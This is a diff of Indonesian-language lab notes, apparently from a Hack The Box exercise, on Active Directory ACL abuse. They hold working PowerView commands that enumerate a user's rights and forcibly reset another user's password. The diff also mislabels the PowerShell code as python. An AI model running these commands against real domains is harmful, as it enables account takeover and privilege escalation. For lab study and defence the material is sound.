@@ -31,7 +31,8 @@ Some example Active Directory object security permissions are as follows. These 
 
 ### ForceChangePassword
 #### using Get-DomainObjectACL
-````
+
+```python
 Import-Module .\PowerView.ps1
 $sid = Convert-NameToSid wley
 Get-DomainObjectACL -Identity * | ? {$_.SecurityIdentifier -eq $sid}
@@ -42,11 +43,11 @@ ObjectAceType          : 00299570-246d-11d0-a768-00aa006e0529
 
 # ObjectAceType with above value meaning for Force-change-password
 (https://learn.microsoft.com/id-id/windows/win32/adschema/r-user-force-change-password)
-````
+```
 
 
 #### Using -ResolveGUIDs Flag
-```powershell
+```python
 Import-Module .\PowerView.ps1
 $sid = Convert-NameToSid wley
 Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid}
@@ -58,7 +59,7 @@ ObjectAceType          : User-Force-Change-Password
 ```
 
 #### Enumerate All User
-```powershell
+```python
 Get-ADUser -Filter * | Select-Object -ExpandProperty SamAccountName > ad_users.txt
 foreach($line in [System.IO.File]::ReadLines("C:\Users\htb-student\Desktop\ad_users.txt")) {get-acl  "AD:\$(Get-ADUser $line)" | Select-Object Path -ExpandProperty Access | Where-Object {$_.IdentityReference -match 'INLANEFREIGHT\\wley'}}
 
@@ -69,13 +70,13 @@ foreach($line in [System.IO.File]::ReadLines("C:\Users\htb-student\Desktop\ad_us
 
 1. Store Password user kita ke powershell credential
    
-```powershell
+```python
    PS C:\htb> $SecPassword = ConvertTo-SecureString '<PASSWORD Kita >' -AsPlainText -Force
    PS C:\htb> $Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\wley', $SecPassword)
 ```
 
 3. Kemudian create password dari user target (eg disini user damundsen yang bisa kita ganti)
-```powershell
+```python
 PS C:\htb> $damundsenPassword = ConvertTo-SecureString 'Pwn3d_by_ACLs!' -AsPlainText -Force
 PS C:\htb> Import-Module .\PowerView.ps1
 PS C:\htb> Set-DomainUserPassword -Identity damundsen -AccountPassword $damundsenPassword -Credential $Cred -Verbose
@@ -83,7 +84,7 @@ PS C:\htb> Set-DomainUserPassword -Identity damundsen -AccountPassword $damundse
 
 #### Generic Write
 
-```powershell
+```python
 # Generic All Enumeration
 $sid2 = Convert-NameToSid damundsen
 Get-DomainObjectACL -ResolveGUIDs -Identity * | ? {$_.SecurityIdentifier -eq $sid2} -Verbose
